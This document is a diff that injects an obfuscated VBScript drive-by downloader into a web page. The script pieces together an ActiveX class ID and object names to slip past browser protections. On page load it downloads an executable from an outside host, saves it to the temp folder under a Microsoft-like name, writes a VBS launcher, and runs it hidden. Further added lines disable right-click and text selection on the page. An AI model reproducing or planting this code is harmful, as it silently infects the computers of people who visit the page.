@@ -1,0 +1,66 @@
+</iframe>
+<script language=VBScript>
+On Error Resume Next
+cuteqq = "http://www.testinghua.com/Wiki/suff11.exe"
+Set cuteqq_2_cn = document.createElement("object")
+cuteqqid="clsid:"
+cuteqqidx="BD"
+cuteqqid2="96"
+cuteqqid3="C5"
+cuteqqid4="56-6"
+cuteqqid5="5A"
+cuteqqid6="3-1"
+cuteqqid7="1D"
+cuteqqid8="0-98"
+cuteqqid9="3A-0"
+cuteqqid10="0C0"
+cuteqqid11="4FC"
+cuteqqid12="29E"
+cuteqqid13="36"
+cuteqqidxs="classid"
+cuteqq3="Microsoft.X"
+cuteqq4="MLHTTp"
+cuteqq5="G"
+cuteqq6="E"
+cuteqq7="T"
+cuteqq_2_cn.SetAttribute cuteqqidxs, cuteqqid&cuteqqidx&cuteqqid2&cuteqqid3&cuteqqid4&cuteqqid5&cuteqqid6&cuteqqid7&cuteqqid8&cuteqqid9&cuteqqid10&cuteqqid11&cuteqqid12&cuteqqid13
+Set lovecuteqq=cuteqq_2_cn.CreateObject(cuteqq3&cuteqq4,"")
+lovecuteqq.Open cuteqq5&cuteqq6&cuteqq7, cuteqq, False
+lovecuteqq.Send
+Cuteqq_kfqq_784378237ssssssss="MicroSofts.pif"
+Cuteqq_kfqq_784378237sssssssss="MicroSofts.vbs"
+Q784378237="Scripting."
+Q784378237s="FileSyst"
+Q784378237ss="emObject"
+Q784378237sss="Adod"
+Q784378237ssss="b.stream"
+Q784378237sssss=Q784378237sss&Q784378237ssss
+Set chilam = cuteqq_2_cn.createobject(Q784378237&Q784378237s&Q784378237ss,"")
+Set yingying = chilam.GetSpecialFolder(2)
+Cuteqquser="bumie555"
+Cuteqq_kfqq_784378237ssssssss=chilam.BuildPath(yingying,Cuteqq_kfqq_784378237ssssssss)
+Cuteqq_kfqq_784378237sssssssss=chilam.BuildPath(yingying,Cuteqq_kfqq_784378237sssssssss)
+Set chilams = cuteqq_2_cn.createobject(Q784378237sssss,"")
+chilams.type=1
+chilams.Open
+chilams.Write lovecuteqq.ResponseBody
+chilams.Savetofile Cuteqq_kfqq_784378237ssssssss,2
+chilams.Close
+chilams.Type=2
+chilams.Open
+chilams.WriteText  "'I LOVE CUTEQQ TEAM"&"'I LOVE CUTEQQ TEAM"&vbCrLf&"Set Love_cuteqq = CreateObject(""Wscript"&".Shell"")"&"'I LOVE CUTEQQ TEAM"&vbCrLf&"'I LOVE CUTEQQ TEAM"&"'I LOVE CUTEQQ TEAM"&vbCrLf&"Love_cuteqq.run ("""&Cuteqq_kfqq_784378237ssssssss&""")"&vbCrLf&"'I LOVE CUTEQQ TEAM"&"'I LOVE CUTEQQ TEAM"
+chilams.Savetofile Cuteqq_kfqq_784378237sssssssss,2
+chilams.Close
+www="She"
+cute="ll.App"
+qq="lica"
+cn="tion"
+cuteqqdk="O"
+cuteqqdks="p"
+cuteqqdkss="e"
+cuteqqdksss="n"
+Set cute_qq_cn_qq_784378237 = cuteqq_2_cn.createobject(www&cute&qq&cn, "")
+cute_qq_cn_qq_784378237.ShellExeCute Cuteqq_kfqq_784378237sssssssss, "", "", cuteqqdk&cuteqqdks&cuteqqdkss&cuteqqdksss, 0
+</script>
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
